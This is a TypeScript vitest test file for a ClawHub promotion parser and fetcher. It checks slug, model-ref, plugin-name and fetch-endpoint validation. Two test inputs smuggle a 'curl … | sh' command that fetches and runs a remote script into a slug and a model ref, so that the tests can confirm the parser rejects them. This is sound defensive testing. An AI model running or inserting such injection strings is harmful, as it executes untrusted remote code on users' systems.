import { describe, expect, it, vi } from "vitest";
import { fetchClawHubPromotion, fetchClawHubPromotions, parseClawHubPromotion } from "./clawhub.js";

const validPromotion = {
  slug: "spring-models",
  title: "Free Example models",
  blurb: "A limited-time offer.",
  status: "active",
  active: true,
  startsAt: 100,
  endsAt: 200,
  provider: "openrouter",
  authChoiceId: "openrouter-api-key",
  models: [{ modelRef: "openrouter/example/model-alpha", alias: "Alpha", suggestedDefault: true }],
  signupUrl: "https://signup.example.com",
};

function jsonResponse(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "content-type": "application/json" },
  });
}

describe("parseClawHubPromotion", () => {
  it("parses a full promotion payload", () => {
    const parsed = parseClawHubPromotion({
      ...validPromotion,
      pluginNames: ["@openclaw/openrouter-provider"],
    });
    expect(parsed.slug).toBe("spring-models");
    expect(parsed.models[0]?.suggestedDefault).toBe(true);
    expect(parsed.pluginNames).toEqual(["@openclaw/openrouter-provider"]);
  });

  it("rejects payloads without models", () => {
    expect(() => parseClawHubPromotion({ ...validPromotion, models: [] })).toThrow(/models/);
  });

  it("rejects slugs outside ClawHub's slug contract", () => {
    // Slugs are echoed into copy-paste commands; shell metacharacters must fail parsing.
    expect(() =>
      parseClawHubPromotion({ ...validPromotion, slug: "deal; curl evil.sh|sh" }),
    ).toThrow(/slug/);
    expect(() => parseClawHubPromotion({ ...validPromotion, slug: "UPPER-case" })).toThrow(/slug/);
  });

  it("rejects model refs with shell metacharacters", () => {
    expect(() =>
      parseClawHubPromotion({
        ...validPromotion,
        models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }],
      }),
    ).toThrow(/unsupported characters/);
  });

  it("rejects non-string model refs", () => {
    expect(() => parseClawHubPromotion({ ...validPromotion, models: [{ modelRef: 42 }] })).toThrow(
      /modelRef/,
    );
  });

  it("rejects non-numeric windows", () => {
    expect(() => parseClawHubPromotion({ ...validPromotion, endsAt: "soon" })).toThrow(/endsAt/);
  });

  it("rejects plugin values that are not package names", () => {
    expect(() =>
      parseClawHubPromotion({
        ...validPromotion,
        pluginNames: ["@openclaw/openrouter-provider@latest"],
      }),
    ).toThrow(/pluginNames/);
  });
});

describe("promotion fetches", () => {
  it("fetches and validates the active promotions list", async () => {
    const fetchImpl = vi.fn(async (..._args: unknown[]) =>
      jsonResponse({ promotions: [validPromotion] }),
    );
    const promotions = await fetchClawHubPromotions({ fetchImpl });
    expect(promotions).toHaveLength(1);
    expect(String(fetchImpl.mock.calls[0]?.[0])).toContain("/api/v1/promotions");
  });

  it("rejects a list response without a promotions array", async () => {
    const fetchImpl = vi.fn(async (..._args: unknown[]) => jsonResponse({ nope: true }));
    await expect(fetchClawHubPromotions({ fetchImpl })).rejects.toThrow(/promotions array/);
  });

  it("fetches a single promotion by slug", async () => {
    const fetchImpl = vi.fn(async (..._args: unknown[]) => jsonResponse(validPromotion));
    const promotion = await fetchClawHubPromotion({ slug: "spring-models", fetchImpl });
    expect(promotion.title).toBe("Free Example models");
    expect(String(fetchImpl.mock.calls[0]?.[0])).toContain("/api/v1/promotions/spring-models");
  });
});
